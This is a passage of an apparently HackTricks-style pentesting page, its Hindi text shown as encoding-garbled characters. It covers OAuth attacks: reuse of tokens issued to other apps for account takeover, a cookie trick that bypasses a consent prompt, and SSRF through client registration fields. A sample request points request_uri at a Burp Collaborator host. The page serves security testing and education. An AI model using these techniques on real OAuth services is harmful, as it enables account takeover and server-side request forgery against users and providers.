рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рд╣реИ**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth рдкреНрд░рд╡рд╛рд╣ рдЬреЛ **рдЯреЛрдХрди** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддреЗ рд╣реИрдВ (рдФрд░ рдХреЛрдб рдирд╣реАрдВ) рд╡реЗ рдХрдордЬреЛрд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рд╡реЗ рдпрд╣ рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддреЗ рдХрд┐ рдЯреЛрдХрди рдРрдк рдХрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред

рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдПрдХ **OAuth рд╕рдорд░реНрдерди рд╡рд╛рд▓рд╛ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ Facebook рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВред рдлрд┐рд░, рдПрдХ рдмрд╛рд░ рдЬрдм рдкреАрдбрд╝рд┐рдд Facebook рдХреЗ рд╕рд╛рде **рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдРрдкреНрд▓рд┐рдХреЗрд╢рди** рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ **OAuth рдЯреЛрдХрди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреЗ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдФрд░ рдЙрд╕реЗ рдкреАрдбрд╝рд┐рдд рдХреЗ OAuth рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдкреАрдбрд╝рд┐рдд рдХреЗ рдпреВрдЬрд░ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

{% hint style="danger" %}
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдпреВрдЬрд░ рдХреЛ рдЕрдкрдиреЗ OAuth рдРрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЙрди рдРрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЗ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рдкрд░ рдХрдмреНрдЬрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ рдЬреЛ рдПрдХ рдЯреЛрдХрди рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдЯреЛрдХрди рдЙрдирдХреЗ рдРрдк ID рдХреЛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдпрд╛ рдирд╣реАрдВред
{% endhint %}

### рджреЛ рд▓рд┐рдВрдХреНрд╕ рдФрд░ рдХреБрдХреА <a href="#bda5" id="bda5"></a>

[**рдЗрд╕ рд▓реЗрдЦ рдХреЗ рдЕрдиреБрд╕рд╛рд░**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), рдпрд╣ рд╕рдВрднрд╡ рдерд╛ рдХрд┐ рдкреАрдбрд╝рд┐рдд рдХреЛ рдПрдХ рдкреЗрдЬ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛рдП рдЬрд┐рд╕рдореЗрдВ **returnUrl** рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╣реЛрд╕реНрдЯ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реЛред рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА **рдХреБрдХреА (RU)** рдореЗрдВ **рд╕рдВрдЧреНрд░рд╣реАрдд** рдХреА рдЬрд╛рдПрдЧреА рдФрд░ рдПрдХ **рдмрд╛рдж рдХреЗ рдЪрд░рдг** рдореЗрдВ **рдкреНрд░реЙрдореНрдкреНрдЯ** рдпреВрдЬрд░ рд╕реЗ **рдкреВрдЫреЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рд╡рд╣ рдЙрд╕ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╣реЛрд╕реНрдЯ рдХреЛ рдПрдХреНрд╕реЗрд╕ рджреЗрдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИред

рдЗрд╕ рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕рдВрднрд╡ рдерд╛ рдХрд┐ рдПрдХ рдЯреИрдм рдЦреЛрд▓рдХрд░ **Oauth рдкреНрд░рд╡рд╛рд╣** рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рдП рдЬреЛ рдЗрд╕ RU рдХреБрдХреА рдХреЛ **returnUrl** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрдЯ рдХрд░реЗрдЧрд╛, рдкреНрд░реЙрдореНрдкреНрдЯ рджрд┐рдЦрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЯреИрдм рдХреЛ рдмрдВрдж рдХрд░ рджреЗрдВ, рдФрд░ рдмрд┐рдирд╛ рдЙрд╕ рдорд╛рди рдХреЗ рдПрдХ рдирдпрд╛ рдЯреИрдм рдЦреЛрд▓реЗрдВред рдлрд┐рд░, **рдкреНрд░реЙрдореНрдкреНрдЯ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╣реЛрд╕реНрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реВрдЪрд┐рдд рдирд╣реАрдВ рдХрд░реЗрдЧрд╛**, рд▓реЗрдХрд┐рди рдХреБрдХреА рдЙрд╕рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рд╣реЛ рдЬрд╛рдПрдЧреА, рдЗрд╕рд▓рд┐рдП **рдЯреЛрдХрди рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╣реЛрд╕реНрдЯ рдХреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрд╢рди рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред

### SSRFs рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ <a href="#bda5" id="bda5"></a>

рдПрдХ рдЫрд┐рдкрд╛ рд╣реБрдЖ URL рдЬрд┐рд╕реЗ рдЖрдк рдпрд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **Dynamic Client Registration endpoint**ред рдпреВрдЬрд░реНрд╕ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, OAuth рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╡рд░рдг рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬреИрд╕реЗ "client\_name", "client\_secret", "redirect\_uris", рдЖрджрд┐ред рдпреЗ рд╡рд┐рд╡рд░рдг рд╕реНрдерд╛рдиреАрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди OAuth рдкреНрд░рд╛рдзрд┐рдХрд░рдг рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдкрд╛рд╕ рдПрдХ **рд╡рд┐рд╢реЗрд╖ рдкрдВрдЬреАрдХрд░рдг рдПрдВрдбрдкреЙрдЗрдВрдЯ** рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕рд╛рдорд╛рдиреНрдпрддрдГ "/register" рдкрд░ рдореИрдк рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рд╛рд░реВрдк рдХреЗ рд╕рд╛рде POST рдЕрдиреБрд░реЛрдз рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ:
```json
POST /connect/register HTTP/1.1
Content-Type: application/json
Host: server.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ ...

{
"application_type": "web",
"redirect_uris": ["https://client.example.org/callback"],
"client_name": "My Example",
"logo_uri": "https://client.example.org/logo.png",
"subject_type": "pairwise",
"sector_identifier_uri": "https://example.org/rdrct_uris.json",
"token_endpoint_auth_method": "client_secret_basic",
"jwks_uri": "https://client.example.org/public_keys.jwks",
"contacts": ["ve7jtb@example.org"],
"request_uris": ["https://client.example.org/rf.txt"]
}
```
рдЗрд╕ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рджреЛ рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рд╣реИрдВ: OAuth рдХреЗ рд▓рд┐рдП [RFC7591](https://tools.ietf.org/html/rfc7591) рдФрд░ [Openid Connect Registration 1.0](https://openid.net/specs/openid-connect-registration-1_0.html#rfc.section.3.1).

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдпрд╣рд╛рдБ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрди рдореВрд▓реНрдпреЛрдВ рдореЗрдВ рд╕реЗ рдХрдИ URL рд╕рдВрджрд░реНрднреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ [Server Side Request Forgery](https://portswigger.net/web-security/ssrf) рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рд▓рдХреНрд╖реНрдп рдХреА рддрд░рд╣ рджрд┐рдЦрддреЗ рд╣реИрдВред рд╕рд╛рде рд╣реА, рд╣рдордиреЗ рдЬрд┐рди рдЕрдзрд┐рдХрд╛рдВрд╢ рд╕рд░реНрд╡рд░реЛрдВ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рд╣реИ, рд╡реЗ рдЗрди URL рдХреЛ рдкрдВрдЬреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░ рддреБрд░рдВрдд рд╣рд▓ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рд╡реЗ рдмрд╕ **рдЗрди рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЛ рд╕рд╣реЗрдЬрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ OAuth рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкреНрд░рд╡рд╛рд╣ рдХреЗ рджреМрд░рд╛рди рдмрд╛рдж рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ**ред рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, рдпрд╣ рдПрдХ рджреВрд╕рд░реЗ-рдХреНрд░рдо рдХрд╛ SSRF рдЕрдзрд┐рдХ рд╣реИ, рдЬреЛ рдХрд┐ рдмреНрд▓реИрдХ-рдмреЙрдХреНрд╕ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЛ рдХрдард┐рди рдмрдирд╛рддрд╛ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ SSRF рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИрдВ:

* **logo\_uri** - URL рдЬреЛ **рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓реЛрдЧреЛ** рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрддрд╛ рд╣реИред **рдХреНрд▓рд╛рдЗрдВрдЯ рдкрдВрдЬреАрдХреГрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж**, рдЖрдк рдЕрдкрдиреЗ рдирдП "client\_id" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ OAuth рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдПрдВрдбрдкреЙрдЗрдВрдЯ ("/authorize") рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд▓реЙрдЧрд┐рди рдХреЗ рдмрд╛рдж, рд╕рд░реНрд╡рд░ рдЖрдкрд╕реЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдордВрдЬреВрд░реА рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣реЗрдЧрд╛ рдФрд░ **"logo\_uri" рд╕реЗ рдЫрд╡рд┐ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ **рд╕рд░реНрд╡рд░ рд╕реНрд╡рдпрдВ рдЫрд╡рд┐ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ**, рддреЛ рдЗрд╕ рдЪрд░рдг рд╕реЗ SSRF рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рд╕рд░реНрд╡рд░ рдХреЗрд╡рд▓ **рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб "\<img>" рдЯреИрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЛрдЧреЛ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ SSRF рдХреА рдУрд░ рдирд╣реАрдВ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ **XSS рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ URL рдмрдЪ рдирд╣реАрдВ рд╣реИ**ред
*   **jwks\_uri** - рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ JSON Web Key Set \[JWK] рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рд▓рд┐рдП URLред рдЬрдм JWTs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдорд╛рдиреНрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдХреА рд╕реЗрдЯ рдХреА рд╕рд░реНрд╡рд░ рдкрд░ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ \[RFC7523]ред рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ SSRF рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг "jwks\_uri" рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрдВрдЬреАрдХреГрдд рдХрд░реЗрдВ**, рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреВрд░рд╛ рдХрд░реЗрдВ рддрд╛рдХрд┐ **рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдФрд░ рдлрд┐рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдмреЙрдбреА рдХреЗ рд╕рд╛рде "/token" рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**:

`POST /oauth/token HTTP/1.1`\
`...`\
\`\`\
`grant_type=authorization_code&code=n0esc3NRze7LTCu7iYzS6a5acc3f0ogp4&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGci...`

рдпрджрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ, рддреЛ **рд╕рд░реНрд╡рд░ рдХреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП "jwks\_uri" рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд░-рд╕реЗ-рд╕рд░реНрд╡рд░ HTTP рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ рдЖрдкрдХреЗ рдЕрдиреБрд░реЛрдз рдореЗрдВ "client\_assertion" рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рд╡реИрдзрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдХреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдпрд╣ рд╢рд╛рдпрдж рдХреЗрд╡рд▓ рдПрдХ **рдЕрдВрдзрд╛ SSRF рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рд╣реЛрдЧреА**, рдХреНрдпреЛрдВрдХрд┐ рд╕рд░реНрд╡рд░ рдПрдХ рдЙрдЪрд┐рдд JSON рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИред
* **sector\_identifier\_uri** - рдпрд╣ URL рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХрд▓ **JSON рдРрд░реЗ рдСрдлрд╝ redirect\_uri рдореВрд▓реНрдп** рд╣реЛрддреЗ рд╣реИрдВред рдпрджрд┐ рд╕рдорд░реНрдерд┐рдд рд╣реИ, рддреЛ рд╕рд░реНрд╡рд░ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЧрддрд┐рд╢реАрд▓ рдкрдВрдЬреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рд╕рдмрдорд┐рдЯ рдХрд░рддреЗ рд╣реА рдЗрд╕ рдореВрд▓реНрдп рдХреЛ **рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ рдпрд╣ рддреБрд░рдВрдд рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рд░реНрд╡рд░ рдкрд░ рдЗрд╕ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред рдЪреВрдВрдХрд┐ рдЗрд╕реЗ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкреНрд░рд╡рд╛рд╣ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП redirect\_uris рдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд╕реЗ рд╕рд░реНрд╡рд░ рдХреЛ рдЖрдкрдХреЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг sector\_identifier\_uri рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
*   **request\_uris** - рдЗрд╕ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП **рдЕрдиреБрдордд request\_uris рдХрд╛ рдПрдХ рдРрд░реЗ**ред "request\_uri" рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ рд╕рдорд░реНрдерд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдиреБрд░реЛрдз рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде JWT рдпреБрдХреНрдд URL рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (рджреЗрдЦреЗрдВ [https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2](https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2))ред

рдпрджрд┐ рдЧрддрд┐рд╢реАрд▓ рдХреНрд▓рд╛рдЗрдВрдЯ рдкрдВрдЬреАрдХрд░рдг рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ, рдпрд╛ рдЗрд╕рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рд╣рдо "request\_uri" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ SSRF рдХрд╛ рдкреНрд░рджрд░реНрд╢рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:\\

`GET /authorize?response_type=code%20id_token&client_id=sclient1&request_uri=https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt`

рдиреЛрдЯ: рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ "redirect\_uri" рдХреЗ рд╕рд╛рде рднреНрд░рдорд┐рдд рди рдХрд░реЗрдВред "redirect\_uri" рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рдмрд╛рдж рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ **"request\_uri" рдХреЛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

рд╕рд╛рде рд╣реА, рд╣рдордиреЗ рдЬрд┐рди рдХрдИ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рджреЗрдЦрд╛ рд╣реИ, рд╡реЗ рдордирдорд╛рдиреЗ "request\_uri" рдореВрд▓реНрдпреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВ: рд╡реЗ рдХреЗрд╡рд▓ рд╕рдлреЗрдж рд╕реВрдЪреА рдореЗрдВ рдбрд╛рд▓реЗ рдЧрдП URL рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдкрдВрдЬреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдкрд╣рд▓реЗ рд╕реЗ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдП рдЧрдП рдереЗред рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдкрд╣рд▓реЗ "request\_uris": "https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt" рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

## OAuth рдкреНрд░рджрд╛рддрд╛ рд░реЗрд╕ рдХрдВрдбреАрд╢рдиреНрд╕

рдпрджрд┐ рдЖрдк рдЬрд┐рд╕ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд░рд╣реЗ рд╣реИрдВ рд╡рд╣ рдПрдХ OAuth рдкреНрд░рджрд╛рддрд╛ рд╣реИ [**рдЗрд╕реЗ рдкрдврд╝реЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рд░реЗрд╕ рдХрдВрдбреАрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**](race-condition.md).

## рд╕рдВрджрд░реНрдн

* [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
* [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
